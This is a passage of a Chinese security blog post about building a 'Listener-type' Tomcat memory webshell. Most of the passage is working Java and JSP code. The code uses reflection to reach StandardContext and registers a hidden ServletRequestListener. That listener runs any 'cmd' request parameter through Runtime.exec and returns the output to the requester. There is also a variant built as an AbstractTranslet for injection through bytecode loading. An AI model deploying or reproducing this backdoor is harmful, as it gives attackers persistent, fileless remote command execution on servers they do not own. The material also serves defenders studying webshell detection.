WRAP_SAME_OBJECT.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class="line">            modifiersField.setAccessible(true);</span><br><span class="line">            modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            if (!WRAP_SAME_OBJECT.getBoolean(null)) &#123;</span><br><span class="line">                WRAP_SAME_OBJECT.setBoolean(null, true);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            //初始化lastServicedRequest</span><br><span class="line">            Class filterchain = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;);</span><br><span class="line">            Field lastServicedRequest = filterchain.getDeclaredField(&quot;lastServicedRequest&quot;);</span><br><span class="line">            modifiersField = lastServicedRequest.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class="line">            modifiersField.setAccessible(true);</span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            lastServicedRequest.setAccessible(true);</span><br><span class="line">            if (lastServicedRequest.get(null) == null) &#123;</span><br><span class="line">                lastServicedRequest.set(null, new ThreadLocal());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            //初始化初始化lastServicedResponse</span><br><span class="line">            Field lastServicedResponse = filterchain.getDeclaredField(&quot;lastServicedResponse&quot;);</span><br><span class="line">            modifiersField = lastServicedResponse.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class="line">            modifiersField.setAccessible(true);</span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            lastServicedResponse.setAccessible(true);</span><br><span class="line">            if (lastServicedResponse.get(null) == null) &#123;</span><br><span class="line">                lastServicedResponse.set(null, new ThreadLocal());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>写一下第二步的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import org.apache.catalina.connector.Request;</span><br><span class="line">import org.apache.catalina.connector.RequestFacade;</span><br><span class="line">import org.apache.catalina.connector.Response;</span><br><span class="line">import org.apache.catalina.core.ApplicationContext;</span><br><span class="line">import org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Arrays;</span><br><span class="line">import javax.servlet.ServletContext;</span><br><span class="line">import javax.servlet.ServletRequest;</span><br><span class="line">import javax.servlet.ServletRequestEvent;</span><br><span class="line">import javax.servlet.ServletRequestListener;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class ListenerInject extends AbstractTranslet implements ServletRequestListener &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        //获取request和response</span><br><span class="line">        try &#123;</span><br><span class="line">            Field context= null;</span><br><span class="line">            context = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;).getDeclaredField(&quot;lastServicedRequest&quot;);</span><br><span class="line">            context.setAccessible(true);</span><br><span class="line">            ThreadLocal threadLocal=(ThreadLocal) context.get(null);</span><br><span class="line">            ServletRequest request=null;</span><br><span class="line">            if(threadLocal!=null&amp;&amp;threadLocal.get()!=null)&#123;</span><br><span class="line">                request= (ServletRequest) threadLocal.get();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if(request!=null)&#123;</span><br><span class="line">                //获取context</span><br><span class="line">                ServletContext servletContext=request.getServletContext();</span><br><span class="line">                if(servletContext!=null)&#123;</span><br><span class="line">                    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">                    appctx.setAccessible(true);</span><br><span class="line">                    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">                    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">                    stdctx.setAccessible(true);</span><br><span class="line">                    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">                    //注入listener</span><br><span class="line">                    Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class="line">                    List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class="line">                    List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class="line">                    listenerList.add(new ListenerInject());</span><br><span class="line">                    standardContext.setApplicationEventListeners(listenerList.toArray());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class="line">        try &#123;</span><br><span class="line">            Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">            requestf.setAccessible(true);</span><br><span class="line">            Request request= (Request) requestf.get(test);</span><br><span class="line">            Response response=request.getResponse();</span><br><span class="line"></span><br><span class="line">            String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class="line">            System.out.println(cmd);</span><br><span class="line">            if(cmd!=null)&#123;</span><br><span class="line">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class="line">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">                byte[] b = new byte[1024];</span><br><span class="line">                int a = -1;</span><br><span class="line"></span><br><span class="line">                while ((a = in.read(b)) != -1) &#123;</span><br><span class="line">                    baos.write(b, 0, a);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                response.getWriter().write(new String(baos.toByteArray()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>成功注入，over</p>
+<h3 id="另一种动态注入listener的方式"><a href="#另一种动态注入listener的方式" class="headerlink" title="另一种动态注入listener的方式"></a>另一种动态注入listener的方式</h3><p>我发现有一个<code>addApplicationEventListener</code> 方法，可以直接将对象插进去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">standardContext.addApplicationEventListener(new Testlistener());</span><br></pre></td></tr></table></figure>
+
+<p>所以我们的jsp马就可以简化成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.List&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    class Testlistener implements ServletRequestListener &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class="line">            try &#123;</span><br><span class="line">                Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">                requestf.setAccessible(true);</span><br><span class="line">                Request request= (Request) requestf.get(test);</span><br><span class="line">                Response response=request.getResponse();</span><br><span class="line"></span><br><span class="line">                String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class="line">                System.out.println(cmd);</span><br><span class="line">                if(cmd!=null)&#123;</span><br><span class="line">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class="line">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">                    byte[] b = new byte[1024];</span><br><span class="line">                    int a = -1;</span><br><span class="line"></span><br><span class="line">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class="line">                        baos.write(b, 0, a);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    response.getWriter().write(new String(baos.toByteArray()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    //获取StandardContext</span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    appctx.setAccessible(true);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    stdctx.setAccessible(true);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    //注入listener</span><br><span class="line">    standardContext.addApplicationEventListener(new Testlistener());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+
+                </div>
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                Tomcat内存马—Listener型
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2023/06/14/Tomcat内存马—Listener型/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">P1taya</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2023-06-14 22:10</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2023/06/19/%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
+                                   title="外网信息搜集"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">外网信息搜集</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2023/06/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E2%80%94Filter%E5%9E%8B/"
+                                   title="Tomcat内存马—Filter型"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Tomcat内存马—Filter型</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8FListener"><span class="nav-text">构造恶意Listener</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8CListener"><span class="nav-text">实现动态注册Listener</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JSP%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="nav-text">JSP实现内存马注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="nav-text">动态加载字节码实现内存马注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E5%8A%A8%E6%80%81%E6%B3%A8%E5%85%A5listener%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-text">另一种动态注入listener的方式</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2022</span>&nbsp;-&nbsp;2024
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">P1taya</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+        
+
+        <div class="count-item info-item default">
+            
+                <span class="count-box border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">79.9k</span>
+                </span>
+            
+
+            
+                <span class="count-box border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-box border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8FListener"><span class="nav-text">构造恶意Listener</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8CListener"><span class="nav-text">实现动态注册Listener</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JSP%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="nav-text">JSP实现内存马注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="nav-text">动态加载字节码实现内存马注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E5%8A%A8%E6%80%81%E6%B3%A8%E5%85%A5listener%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-text">另一种动态注入listener的方式</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/toggle-theme.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/local-search.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/lazyload.js"></script>
+
+
+<div class="">
+    
+        <!-- post-helper -->
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/post/post-helper.js"></script>
+
+        <!-- toc -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/post/toc.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/post/copyright-info.js"></script>
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+    
+        
+    
+
+</body>
+</html>
